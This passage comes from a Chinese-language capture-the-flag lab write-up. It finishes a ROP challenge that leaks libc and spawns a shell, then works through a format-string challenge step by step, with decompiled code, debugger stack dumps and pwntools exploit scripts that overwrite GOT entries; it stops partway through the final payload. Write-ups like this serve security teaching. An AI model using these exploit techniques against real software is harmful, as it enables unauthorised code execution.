&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">libc_addr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">puts_addr&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="n">puts_offsets&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">log&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">info&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;puts_addr =&amp;gt; &amp;#34;&lt;/span>&lt;span class="o">+&lt;/span> &lt;span class="nb">hex&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">puts_addr&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">log&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">info&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;libc_addr =&amp;gt; 0x&lt;/span>&lt;span class="si">{:016X}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">format&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">libc_addr&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>效果如下：&lt;/p>
&lt;p>&lt;img src="https://s2.loli.net/2024/07/29/N7zCeuRF8pivmtY.png"
loading="lazy"
alt="image-20240727205306318.png"
>&lt;/p>
&lt;p>可以看到获取的 libc 地址为 &lt;code>0x00007F6506C9D000&lt;/code>&lt;/p>
&lt;h3 id="getting-system-shell-1">Getting system shell
&lt;/h3>&lt;p>最后，按如下构造 payload ，可以获取 shell：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;span class="lnt">9
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Step two Getting system shell&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">system_addr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">libc&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">symbols&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;system&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">libc_addr&lt;/span> &lt;span class="c1">#system函数的地址&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">bin_sh_addr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">next&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">libc&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">search&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;/bin/sh&amp;#39;&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">libc_addr&lt;/span> &lt;span class="c1">#‘/bin/sh’的地址&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">log&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">info&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;bin_sh_addr =&amp;gt; &lt;/span>&lt;span class="si">{:016X}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">format&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">bin_sh_addr&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">log&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">info&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;system_addr =&amp;gt; &lt;/span>&lt;span class="si">{:016X}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">format&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">system_addr&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">payload2&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;A&amp;#39;&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="n">offset&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">p64&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">ret_addr&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">p64&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">rdi_ret_addr&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">p64&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">bin_sh_addr&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">p64&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">system_addr&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># pause()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">conn&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">send&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">payload2&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">conn&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">interactive&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>运行后效果如下：&lt;/p>
&lt;p>&lt;img src="https://s2.loli.net/2024/07/29/5fQkt6G91YDpjPn.png"
loading="lazy"
alt="image-20240727205158947.png"
>&lt;/p>
&lt;p>得到 flag 为 &lt;code>AAA{r0p_oN3_5Im3_ROP_f0r3ve3}&lt;/code>&lt;/p>
&lt;h2 id="task3-onefsb">Task3 onefsb
&lt;/h2>&lt;p>本题目的完整代码为 attachment 中的 &lt;code>pwnlab2_task3_code.py&lt;/code>&lt;/p>
&lt;h3 id="preparation-1">Preparation
&lt;/h3>&lt;p>checksec 一下，是关闭了 PIE 保护，同时打开的 Partial RELRO 的 64 位程序，注意到开了 Canary，栈溢出要小心点。&lt;/p>
&lt;p>IDA 反编译一下，&lt;code>main()&lt;/code> 基本逻辑是这样的：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="n">s&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">];&lt;/span> &lt;span class="c1">// [rsp+0h] [rbp-110h] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="kt">unsigned&lt;/span> &lt;span class="kr">__int64&lt;/span> &lt;span class="n">v36&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">// [rsp+108h] [rbp-8h]
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">v36&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">__readfsqword&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x28u&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="c1">// 设置 Canary
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nf">initbuf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">argc&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">argv&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">envp&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;what&amp;#39;s your message: &amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">memset&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">s&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x100&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="c1">// 将 [rbp-110h] 开始到 [rbp-11h] 共 256 个字节的内存清零
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nf">fgets&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">s&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">255&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">stdin&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="c1">// 从 s 开始输入 255 256 个字节
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">s&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">puts&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;bye&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>做这题的时候，我首先想到利用 FSB Bug ，使用类似于前两道 Task 的思路，先泄漏 &lt;code>main()&lt;/code> 的返回地址从而获得 libc 地址，如果不方便获得 &lt;code>main()&lt;/code> 的返回地址，就想办法泄漏其他函数的地址，然后利用 ROP 将程序 return 到 &lt;code>system('/bin/sh')&lt;/code> 上，但是实际操作时遇到了只有一次利用 FSB 的机会，若劫持控制流就不能泄漏 &lt;code>main()&lt;/code> 的返回地址 ，然后是 &lt;code>printf()&lt;/code> 使用 &lt;code>%u&lt;/code> 写入时导致段错误，以及直接写 ROP 链太麻烦等各种困难&lt;/p>
&lt;p>然后就是（请求场外援助 sad 后得到的 hint） Partial RELRO ，它允许我们能够覆写 GOT 表，可不可以获取 &lt;code>system&lt;/code> 的 GOT 表地址将其覆盖到 &lt;code>main()&lt;/code> 要调用的一个函数在 GOT 表上的地址从而达到调用 &lt;code>system(&amp;quot;/bin/sh&amp;quot;)&lt;/code> 的机会？结果也不行，一次利用 FSB 的限制不能让我做到这一点。那能不能用覆写 GOT 表从而做到无限利用 FSB ? 等等，&lt;code>main()&lt;/code> 结束前怎么有一个 &lt;code>puts(&amp;quot;bye&amp;quot;)&lt;/code> ，豁然开朗了：把 &lt;code>puts_got&lt;/code> 变成 &lt;code>main()&lt;/code> ，这样就让做完恶作剧的小鬼程序被狠狠脑控定身任我为非作歹 😡😡😡 ；至于 ROP 链，换成一个 one_gadget ，在这里找到的是这个：&lt;/p>
&lt;pre>&lt;font color="#D7D7FF">0xebc85&lt;/font> execve(&amp;quot;/bin/sh&amp;quot;, &lt;font color="#5FFF00">r10&lt;/font>, &lt;font color="#5FFF00">rdx&lt;/font>)
&lt;font color="#FF5F5F">constraints&lt;/font>:
address &lt;font color="#5FFF00">rbp&lt;/font>-&lt;font color="#D7D7FF">0x78&lt;/font> is writable
[&lt;font color="#5FFF00">r10&lt;/font>] == NULL || &lt;font color="#5FFF00">r10&lt;/font> == NULL || &lt;font color="#5FFF00">r10&lt;/font> is a valid argv
[&lt;font color="#5FFF00">rdx&lt;/font>] == NULL || &lt;font color="#5FFF00">rdx&lt;/font> == NULL || &lt;font color="#5FFF00">rdx&lt;/font> is a valid envp
&lt;/pre>
&lt;p>在第一次 payload，要做的就是：劫持控制流，将 &lt;code>puts_got&lt;/code> 覆写成 &lt;code>main()&lt;/code> ，让程序想 &amp;ldquo;bye&amp;rdquo; 却被我狠狠脑控当场拿下&lt;/p>
&lt;p>第二次，输出 &lt;code>printf()&lt;/code> 地址从而获取 libc 地址，从而获得 one_gadget 的地址&lt;/p>
&lt;p>第三次，就是将 &lt;code>puts_got&lt;/code> 覆写成 one_gadget ，对我言听计从 😤😤😤&lt;/p>
&lt;h3 id="getting-offsets">Getting offsets
&lt;/h3>&lt;p>首先打开程序，确定格式化字符串的相对偏移。打开程序，输入 &lt;code>AAAAAAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p&lt;/code> ，结果如下：&lt;/p>
&lt;p>&lt;img src="https://s2.loli.net/2024/07/29/kmynu7LHE4gA6zG.png"
loading="lazy"
alt="image-20240728164321356.png"
>&lt;/p>
&lt;p>可以看到， &lt;code>AAAAAAAA&lt;/code> ，即 &lt;code>0x4141414141414141&lt;/code> 位于格式化字符串后的第六个偏移。&lt;/p>
&lt;p>使用 gdb 调试， 输入 &lt;code>AAAAAAAA&lt;/code> 后断点在 &lt;code>printf()&lt;/code> 内，然后看栈内容，结果如下：&lt;/p>
&lt;pre>&lt;font color="#C01C28">&lt;b>pwndbg&amp;gt; &lt;/b>&lt;/font>x /40gx $rsp
&lt;font color="#12488B">0x7fffffffdac8&lt;/font>: 0x000000000040139e 0x4141414141414141
&lt;font color="#12488B">0x7fffffffdad8&lt;/font>: 0x000000000000000a 0x0000000000000000
&lt;font color="#12488B">0x7fffffffdae8&lt;/font>: 0x0000000000000000 0x0000000000000000
&lt;font color="#12488B">0x7fffffffdaf8&lt;/font>: 0x0000000000000000 0x0000000000000000
&lt;font color="#12488B">0x7fffffffdb08&lt;/font>: 0x0000000000000000 0x0000000000000000
&lt;font color="#12488B">0x7fffffffdb18&lt;/font>: 0x0000000000000000 0x0000000000000000
&lt;font color="#12488B">0x7fffffffdb28&lt;/font>: 0x0000000000000000 0x0000000000000000
&lt;font color="#12488B">0x7fffffffdb38&lt;/font>: 0x0000000000000000 0x0000000000000000
&lt;font color="#12488B">0x7fffffffdb48&lt;/font>: 0x0000000000000000 0x0000000000000000
&lt;font color="#12488B">0x7fffffffdb58&lt;/font>: 0x0000000000000000 0x0000000000000000
&lt;font color="#12488B">0x7fffffffdb68&lt;/font>: 0x0000000000000000 0x0000000000000000
&lt;font color="#12488B">0x7fffffffdb78&lt;/font>: 0x0000000000000000 0x0000000000000000
&lt;font color="#12488B">0x7fffffffdb88&lt;/font>: 0x0000000000000000 0x0000000000000000
&lt;font color="#12488B">0x7fffffffdb98&lt;/font>: 0x0000000000000000 0x0000000000000000
&lt;font color="#12488B">0x7fffffffdba8&lt;/font>: 0x0000000000000000 0x0000000000000000
&lt;font color="#12488B">0x7fffffffdbb8&lt;/font>: 0x0000000000000000 0x0000000000000000
&lt;font color="#12488B">0x7fffffffdbc8&lt;/font>: 0x0000000000000000 0x0000000000000000
&lt;font color="#12488B">0x7fffffffdbd8&lt;/font>: 0xf53edbb42f9f1d00 0x0000000000000001
&lt;font color="#12488B">0x7fffffffdbe8&lt;/font>: 0x00007ffff7c29d90 0x0000000000000000
&lt;font color="#12488B">0x7fffffffdbf8&lt;/font>: 0x00000000004011fd 0x0000000100000000
&lt;font color="#C01C28">&lt;b>pwndbg&amp;gt; &lt;/b>&lt;/font>p $rbp
&lt;font color="#2AA1B3">$3&lt;/font> = (void *) &lt;font color="#12488B">0x7fffffffdbe0&lt;/font>
&lt;font color="#C01C28">&lt;b>pwndbg&amp;gt; &lt;/b>&lt;/font>p $rsp
&lt;font color="#2AA1B3">$4&lt;/font> = (void *) &lt;font color="#12488B">0x7fffffffdac8&lt;/font>
&lt;/pre>
&lt;p>可以看到，输入的格式字符串 &lt;code>AAAAAAAA&lt;/code> 位于栈的第二位，由于此时位于 &lt;code>printf()&lt;/code> 函数内， &lt;strong>栈的最顶部 rbp 指向的是 &lt;code>printf()&lt;/code> 的返回地址，所以不算做参数&lt;/strong>，同时由于是 64 位程序，前六个参数在寄存器内，所以格式字符串就是 &lt;code>printf()&lt;/code> 的第七个参数，也就是格式化字符串（ rdi ）后的第六个偏移。&lt;/p>
&lt;h3 id="hijacking-control-flow">Hijacking control flow
&lt;/h3>&lt;p>首先就是拿下 &lt;code>puts()&lt;/code> ，像这样构建 payload ：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="n">context&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">arch&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;amd64&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">os&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;linux&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">log_level&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;DEBUG&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">puts_plt&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">elf&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">plt&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;puts&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">puts_got&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">elf&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">got&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;puts&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">printf_got&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">elf&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">got&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;printf&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">printf_offset&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">libc&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">symbols&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;printf&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># pause()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">main_addr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x4011fd&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">payload&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">fmtstr_payload&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">6&lt;/span>&lt;span class="p">,{&lt;/span>&lt;span class="n">puts_got&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="n">main_addr&lt;/span>&lt;span class="p">},&lt;/span>&lt;span class="n">write_size&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;short&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">conn&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sendlineafter&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">b&lt;/span>&lt;span class="s2">&amp;#34;what&amp;#39;s your message: &amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">payload&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">conn&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">interactive&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>运行，结果如下：&lt;/p>
&lt;p>&lt;img src="https://s2.loli.net/2024/07/29/jsaKU3qtSnzMcm2.png"
loading="lazy"
alt="image-20240728224258130.png"
>&lt;/p>
&lt;h3 id="leaking-libc-address">Leaking libc address
&lt;/h3>&lt;p>有了前面两道 Task 的经验，这次 leak 可以算很顺利了：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Second payload: leaking libc address&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">payload2&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;%7$sKKKK&amp;#39;&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">p64&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">printf_got&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">conn&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sendlineafter&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">b&lt;/span>&lt;span class="s2">&amp;#34;what&amp;#39;s your message: &amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">payload2&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">recv&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">conn&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">recvuntil&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;KKKK&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">recv&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">recv&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">strip&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;KKKK&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">recv&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">recv&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">ljust&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="se">\0&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">printf_addr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">u64&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">recv&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">libc_addr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">printf_addr&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="n">printf_offset&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">log&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">success&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;printf_addr =&amp;gt; 0x&lt;/span>&lt;span class="si">{:016X}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">format&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">printf_addr&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">log&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">success&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;libc_addr =&amp;gt; 0x&lt;/span>&lt;span class="si">{:016X}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">format&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">libc_addr&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">conn&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">interactive&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>运行结果如下：&lt;/p>
&lt;p>&lt;img src="https://s2.loli.net/2024/07/29/5XrJbkKFaWAp3P9.png"
loading="lazy"
alt="image-20240728225353011.png"
>&lt;/p>
&lt;p>可以看到最终得到的 libc 地址为 &lt;code>0x00007F3EDFC00000&lt;/code>&lt;/p>
&lt;h3 id="getting-system-shell-2">Getting system shell
&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Third payload: getting system shell&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">pop_rdi_addr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x000000000002a3e5&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">libc_addr&lt;/span>
